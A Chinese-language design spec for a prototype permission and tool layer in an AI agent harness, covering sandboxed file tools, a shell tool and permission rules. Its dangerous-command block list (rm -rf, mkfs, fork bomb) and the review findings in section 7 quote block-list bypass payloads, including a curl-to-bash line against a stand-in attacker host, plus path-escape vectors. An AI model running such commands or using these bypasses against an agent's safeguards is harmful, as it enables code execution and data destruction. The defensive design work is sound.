# ACI 原型工具层 — 冻结契约（PROTOTYPE）

> 状态：**冻结**，供 implementer 直接编码。这是原型（throwaway），验证一个问题：
> **ch04 的 ACI 能力（权限检查 / 安全标记 / 延迟加载 / 四大组件）能否以"加法式装饰层"嫁接到 iknow harness 已冻结的 4-tool 协议上，而不破坏协议、不碰产品流量。**
>
> 验证通过后，被验证的决策（装饰层形状）可折入真代码；原型本体留档。

## 0. 不可违背的硬约束（来自 SSOT）

1. **4-tool 协议不动**：`src/harness/tools/types.ts` 的 `ToolDef / ToolHandler / ToolCall / ToolExecutionResult / Executor / Registry` 一律 **只 import，不修改**。ACI 层是扩展（`extends`）与装饰（wrap），不是改协议。
2. **不改冻结出口**：`src/harness/index.ts` 不动。ACI 有自己的出口 `src/harness/aci/index.ts`。
3. **不碰产品**：不 import `src/tools/`、`src/kb-*`、`src/agent-loop`（不存在）、`_upstream_gbrain/`。不接 session-api / cli 生产装配路径。
4. **ESM 规范**：`module: NodeNext`，所有相对 import **必须带 `.js` 后缀**；type-only import 用 `import type`（`verbatimModuleSyntax: true`）；`strict: true` + `noUnusedLocals` + `noUnusedParameters`。
5. **JSON-compatible 返回**：handler 返回 string / number / boolean / null / array / plain object；禁止 undefined / BigInt / Date / Map / class instance / 循环引用。
6. **schema 防呆**：所有工具 `inputSchema` 设 `additionalProperties: false`；用纯 JSON Schema（`Record<string, unknown>`），**不用 Zod**；校验走 harness 的 ajv（`createRegistry` 已编译）。
7. **业务失败**：用 `ToolExecutionError`（从 `../errors.js` import）抛出，Executor 保留 message；未知异常会被净化。
8. **Gate B 禁词**（`tests/harness/public-exports.test.ts` 会扫描 `src/harness/` 全部 `.ts`，含子目录）：源码行（非文档豁免行）不得出现（小写包含）：`retry` / `checkpoint` / `tokenusage` / `costusd` / `httpstatus` / `requestid` / `otel` / `span` / `metric` / `withresolvers`。
   - ⚠️ 措辞规避：用 "window/range/duration" 代替任何含 span 的词；用 "counter/totals" 代替 metric；注释里如必须提及，写进豁免句式（含 "deferred"/"explicitly not"/"never build" 等）。
9. **immutable 风格**：工厂返回 `Object.freeze(...)`；与 harness 既有风格一致。
10. **每个文件头**：中文 JSDoc 注释，首行标注 `PROTOTYPE（throwaway）`，说明职责与边界（仿 `demo-tools.ts` 风格，注释解释 why 不解释 what）。

## 1. 目录布局

```
src/harness/aci/
  types.ts            # Layer 0: AciMeta / AciToolDef / PermissionDecision / Policy / Catalog 接口
  permission.ts       # Layer 0: checkPermission + isDangerousCommand + createPermissionPolicy
  aci-executor.ts     # Layer 0: createAciExecutor(inner, catalog, opts) -> Executor（装饰，注入阶段④）
  aci-registry.ts     # Layer 0: createAciRegistry(tools) -> { inner, catalog, visibleSchemas, discover }
  index.ts            # Layer 0: ACI 公共出口（独立于 harness/index.ts）
  tools/
    fs-search.ts      # Layer 1: read-only，限 50 条，绝对路径
    fs-view.ts        # Layer 1: read-only，有状态查看器（一次 100 行，跨调用记位置）
    fs-edit.ts        # Layer 1: write，写入前 Linter 拒绝坏补丁（poka-yoke）
    shell-exec.ts     # Layer 1: execute，危险命令拒绝 + 沙箱目录
    context-manager.ts# Layer 1: read-only，压缩旧观测
  demo.ts             # Layer 2: 一条命令跑通全生命周期，每步打印完整状态
tests/harness/aci/
  permission.test.ts
  aci-executor.test.ts
  aci-registry.test.ts
  tools.test.ts
  demo.test.ts        # 端到端：经 loop-engine run() + createAciExecutor
```

## 2. Layer 0 精确签名（冻结，implementer-A 实现）

### types.ts
```ts
import type { ToolDef } from "../tools/types.js";

/** ch04 四类安全级别。 */
export type AciCategory = "read-only" | "write" | "execute" | "collaborate";

/** ACI 安全/调度元数据：加在冻结 ToolDef 之外的扩展字段。 */
export interface AciMeta {
  readonly category: AciCategory;
  readonly isReadOnly: boolean;
  readonly isDestructive: boolean;
  readonly isConcurrencySafe: boolean;
  readonly interruptBehavior: "cancel" | "block";
  /** true = 延迟加载：默认不进 prompt schema，需 discover() 检索注入。默认 false（核心常驻）。 */
  readonly lazy?: boolean;
}

/** ACI 工具定义 = 冻结 ToolDef + aci 元数据（扩展，不改协议）。 */
export interface AciToolDef extends ToolDef {
  readonly aci: AciMeta;
}

/** 权限三值决策（ch04 阶段④）。 */
export type PermissionDecision = "allow" | "deny" | "pass_through";

export interface PermissionOutcome {
  readonly decision: PermissionDecision;
  /** 人/模型可读的决策理由（会进 execution_failed message）。 */
  readonly reason: string;
}

/** 规则层：always_allow / always_deny / ask（原型里 ask 收敛为 allow + 标记，无人工回路）。 */
export type PermissionRule = "always_allow" | "always_deny" | "ask";

export interface AciPermissionPolicy {
  readonly defaultRule: PermissionRule;
  readonly byName?: Readonly<Record<string, PermissionRule>>;
  /** execute 类是否拦截危险命令；默认 true。 */
  readonly denyDangerousExecute?: boolean;
}

/** ACI 目录：按名定位 AciToolDef（权限层与延迟加载共用）。 */
export interface AciCatalog {
  readonly get: (name: string) => AciToolDef | undefined;
  readonly all: () => ReadonlyArray<AciToolDef>;
}
```

### permission.ts
```ts
export function createPermissionPolicy(opts?: Partial<AciPermissionPolicy>): AciPermissionPolicy;
// 默认 defaultRule="ask", denyDangerousExecute=true。

export function isDangerousCommand(command: string): boolean;
// 黑名单 poka-yoke：rm -rf / mkfs / dd if= / :(){ :|:& };: / shutdown / reboot /
// format / del /f / rd /s，以及 shell 操作符链（&&, |, ;, ``, $()）—— 命中即 true。
// 纯字符串判定，不执行。

export function checkPermission(
  def: AciToolDef,
  input: unknown,
  policy: AciPermissionPolicy
): PermissionOutcome;
// 决策顺序（ch04 三层：规则层 → 类别默认 → 危险拦截）：
//   1. byName[name] 命中 always_allow/always_deny → 直接返回；
//   2. category 默认：read-only → allow；write/collaborate → allow（原型 ask 收敛为 allow，reason 注明 "ask→auto-allow in prototype"）；execute → 进入 3；
//   3. execute 且 denyDangerousExecute 且 isDangerousCommand(input.command) → deny，reason 精确指出命中模式；否则 allow。
// 未知工具（catalog 查不到）由 executor 层处理，不在这里。
```

### aci-executor.ts
```ts
import type { Executor } from "../tools/types.js";
export interface AciExecutorOptions {
  readonly policy?: AciPermissionPolicy;
  /** 观测钩子：每次权限决策回调（demo/测试用，不参与决策）。 */
  readonly onDecision?: (call: ToolCall, outcome: PermissionOutcome) => void;
}
export function createAciExecutor(
  inner: Executor,
  catalog: AciCatalog,
  opts?: AciExecutorOptions
): Executor;
// executeAll(calls, signal?, timeoutMs?)：逐个 call（保持串行/无短路/无重试）：
//   - catalog.get(name) 查不到 → 交给 inner（inner 会产 tool_not_found）；
//   - checkPermission → deny → 直接产 { kind:"execution_failed", toolUseId, message:`[permission_denied] ${reason}` }，不调 inner；
//   - allow/pass_through → await inner.executeAll([call], signal, timeoutMs) 取唯一结果；
//   - 每次决策调 onDecision。
// 返回顺序与 calls 一致。
```

### aci-registry.ts
```ts
import type { RegistryImpl } from "./registry.js";  // 注意：从 ../tools/registry.js
export interface AciRegistry {
  /** 冻结协议 registry（交给 createExecutor）。 */
  readonly inner: RegistryImpl;
  readonly catalog: AciCatalog;
  /** 核心（非 lazy）工具 schema —— 默认进 prompt 的集合。 */
  readonly visibleSchemas: () => ReadonlyArray<ToolDef>;
  /** 延迟加载：按需检索某工具 schema（含 lazy 的），未注册返回 undefined。 */
  readonly discover: (name: string) => ToolDef | undefined;
}
export function createAciRegistry(tools: ReadonlyArray<AciToolDef>): AciRegistry;
// inner = createRegistry(tools)（AciToolDef 结构上是 ToolDef，spread 多带 aci 字段无害）；
// catalog 持有 AciToolDef 全量；visibleSchemas 过滤 !lazy；discover 按名返回。
```

### index.ts
重导出上述全部类型与工厂（仿 harness/index.ts 的 `export {}` / `export type {}` 分组）。

## 3. Layer 1 工具规格（冻结，implementer-B* 实现，互不依赖）

所有工具：工厂函数返回 `AciToolDef`（`Object.freeze`），`inputSchema` 带 `additionalProperties:false`，handler 对 unknown input narrow 断言，FS 路径一律解析为**绝对路径**且限制在注入的 `root` 内（越界 → `ToolExecutionError`）。FS/shell 工具签名第一个参数是注入的 `root: string`（沙箱根），便于 demo/测试指向 scratch 目录。

| 工具 | 工厂 | aci meta | input schema | 行为要点（ch04 映射） |
|---|---|---|---|---|
| `fs_search` | `createFsSearchTool(root)` | read-only, isReadOnly:true, isDestructive:false, isConcurrencySafe:true, interruptBehavior:"cancel" | `{ pattern: string, path?: string, limit?: number }`，limit 默认/上限 **50** | 组件①：递归搜文件名/内容匹配，**硬截断 50 条**，返回 `{ matches: string[](绝对路径), truncated: boolean, total: number }` |
| `fs_view` | `createFsViewTool(root)` | read-only, concurrencySafe:true, cancel | `{ path: string, offset?: number }` | 组件②：**有状态**——闭包记 `lastPath/lastOffset`；一次返回 **100 行**；返回 `{ path, lines: string[], from, to, nextOffset, eof }`；offset 缺省时若 path==lastPath 则从 lastOffset 续读，否则从 0 |
| `fs_edit` | `createFsEditTool(root)` | write, isReadOnly:false, isDestructive:false, isConcurrencySafe:false, interruptBehavior:"block" | `{ path, old_str, new_str }` | 组件③ poka-yoke：写入前对 `new_str` 跑 `lintPatch`（括号/方括号/花括号/引号配对栈检查），不配对 → `ToolExecutionError("lint rejected: <具体>")` 拒绝落地；`old_str` 必须恰好出现一次（0 或 >1 → 错）；成功返回 `{ path, replaced: 1 }` |
| `shell_exec` | `createShellExecTool(sandboxDir)` | execute, isReadOnly:false, isDestructive:true, isConcurrencySafe:false, interruptBehavior:"cancel" | `{ command: string }` | 执行类：入口先 `isDangerousCommand` 自保（双保险，权限层已拦）；`child_process` 在 `cwd=sandboxDir` 执行，捕获 stdout/stderr/code，超时由 Executor 外包；返回 `{ code, stdout, stderr }`（截断到合理长度） |
| `context_manager` | `createContextManagerTool()` | read-only, concurrencySafe:true, cancel, **lazy:true**（演示延迟加载） | `{ observations: string[], keepRecent?: number, maxChars?: number }` | 组件④：保留最近 keepRecent（默认 3）条原文，更早的压缩为摘要行（截断 maxChars），返回 `{ kept: string[], compressed: string[], droppedChars: number }` |

`lintPatch` 放 `fs-edit.ts` 内部（不导出，或导出供测试——导出 `lintPatch(text): { ok: boolean; reason?: string }` 便于单测）。

## 4. Layer 2（implementer-C，依赖 Layer 0+1）

### demo.ts
- shebang 不必；通过 `npm run aci:demo`（= `tsx src/harness/aci/demo.ts`）一条命令跑。
- 在 `os.tmpdir()` 下建 `iknow-aci-prototype-<pid>` scratch 目录，造几个样例文件，结束 `rm -rf` 清理（原型自管，名字带 PROTOTYPE 语义）。
- 用 `createStubModel` + 脚本化 `AssistantTurnResult`（仿 `tests/harness/loop-engine.test.ts` 的 `assistantResult` helper，**在 demo 内自带一份 helper**）驱动 `run()`，装配 `createAciRegistry` + `createAciExecutor(createExecutor(reg.inner), reg.catalog, {onDecision})`。
- 场景覆盖（每个场景一段，**每步后打印完整相关状态**——prototype skill 规则5）：
  1. read-only 并发免确认：fs_search 限 50 + fs_view 有状态翻页；
  2. write 需确认 + Linter 拒绝坏补丁（先失败后成功）；
  3. execute 危险命令被权限层 deny（`rm -rf /` → `[permission_denied]`）+ 安全命令放行；
  4. 延迟加载：context_manager(lazy) 不在 visibleSchemas，经 discover() 注入后可用。
- 结尾打印 trace.totals + 一句"被验证的决策"总结。

### package.json
新增 script：`"aci:demo": "tsx src/harness/aci/demo.ts"`（**只加这一个 script，不动依赖、不动 lockfile**）。

### 测试（vitest + node:assert/strict，import 源码带 `.ts` 后缀）
- permission.test.ts：类别默认 / byName 覆盖 / 危险命令 deny / 安全命令 allow。
- aci-executor.test.ts：deny 不调 inner（spy）/ allow 委托 / 顺序保持 / 未知工具交 inner。
- aci-registry.test.ts：visibleSchemas 过滤 lazy / discover 命中与未命中 / inner 可用。
- tools.test.ts：fs_search 限 50 + 绝对路径 + 越界拒绝；fs_view 续读；fs_edit lint 拒绝 + 成功；shell_exec 危险拒绝 + 安全执行；context_manager 压缩。用 scratch 目录（beforeEach 建 / afterEach 清）。
- demo.test.ts：端到端经 `run()`，断言 stopReason=completed 且权限 deny 路径产生 is_error tool_result。

## 5. 验证命令（ground truth）
```bash
npm run typecheck        # tsc --noEmit 全绿
npm test                 # vitest 全绿（含既有 harness 测试不被破坏 + Gate B 扫描通过）
npm run aci:demo         # 一条命令跑通，打印每步状态
```

## 7. 被验证的决策与毕业约束（code review 后回填）

> 本节由三轴 code review（Standards / Spec / Security）后回填。所有结论
> 来自实测对抗测试；约束到毕业前必须遵守。

### 7.1 核心 verdict：危险命令黑名单经对抗测试 21/21 被绕过

安全审查员对 execute 类危险命令黑名单做了对抗测试，**21 个 payload
全部绕过**，典型示例：

- `curl http://attacker/x | bash`（管道不在黑名单的子串列表）；
- `echo ${IFS}`（IFS 变量展开规避空格检测）；
- `'   'rm   '-''rf'`（字符串拼接 trick）；
- PowerShell 编码绕过、UTF-8 BOM、零宽字符等。

**结论**：危险命令黑名单**无法修补成安全**。ACI execute 类工具必须
**allowlist-first**（白名单为主门 + 元字符禁入），黑名单只作纵深双保险。

### 7.2 安全兜底不可被策略绕过

`byName[name] === "always_allow"` 只能豁免 ask 门（即非 execute 类别的
人工回路），**不能豁免 execute 类别安全兜底**（allowlist + blacklist）。
`always_deny` 仍然可在最高优先级短路（关闭工具）。

决策顺序（修复后）：

1. `byName === "always_deny"` → deny（策略最高优先级，可关闭工具）；
2. execute 安全兜底（不可绕过）：
   - command 非字符串 → deny；
   - `!isAllowedCommand(cmd)` → deny `"command not in allowlist: <token>"`；
   - `isDangerousCommand(cmd)` → deny（双保险）；
3. `byName === "always_allow"` → allow（只能豁免 ask 门）；
4. 类别默认：read-only → allow；write/collaborate → allow；execute →
   allow（reason "execute: safe command allowed"）。

### 7.3 路径沙箱（lexical）经验证

对 `../`、绝对路径、UNC 路径、URL 编码（`%2e%2e`）、NTFS 备用数据流等
路径越界向量经测试稳健。**毕业约束**：需补 realpath 防符号链接（symlink
逃逸 lexical 检查）+ 真实 OS 级沙箱。cwd 不是安全边界，**真正的边界是
allowlist + 纵深双保险 + 毕业后的 OS 级沙箱**。

### 7.4 lintPatch 必须是正确的引号/括号状态机

旧实现把 `"` 内部的 `'` 误判为字符串开启（`"it's a test"` 被拒），且
不处理 `\\` 转义（`"C:\Users\x"` 这类 Windows 路径被拒——Windows 项目
致命）。修复后采用 `inString: '"' | "'" | null` + 括号栈 + 字符串内
`\\` 跳过下一字符的完整状态机。**结论**：poka-yoke 必须是正确状态机，
否则会误拒合法补丁（cascading lint 误报会降低工具可信度）。

### 7.5 其他代码 review 发现（已修复）

- **Standards H1/H2**：`lintPatch` 重写为正确状态机（含 `\\` 转义、
  字符串内异种引号作为字面量）。
- **Standards M1**：`fs_edit` 用 `content.split(old_str).join(new_str)`
  替代 `String.replace`，避免 `$&` / `$1` / `$$` 特殊模式损坏文件。
- **Security CRITICAL**：permission 层安全兜底不可被 `always_allow`
  绕过；shell_exec 改 allowlist-first + 信号透传 + env 净化。
- **Security 工具层**：shell_exec handler 签名改 `(input, ctx?)`，
  透传 `ctx?.signal` 给 `exec()`，env 只给 `PATH`。

## 6. 完成判据
- 三条验证命令全绿；
- Gate B 禁词扫描通过（既有 public-exports.test.ts 不红）；
- 既有测试零回归；
- 4-tool 协议类型文件（tools/types.ts 等）git diff 为空。
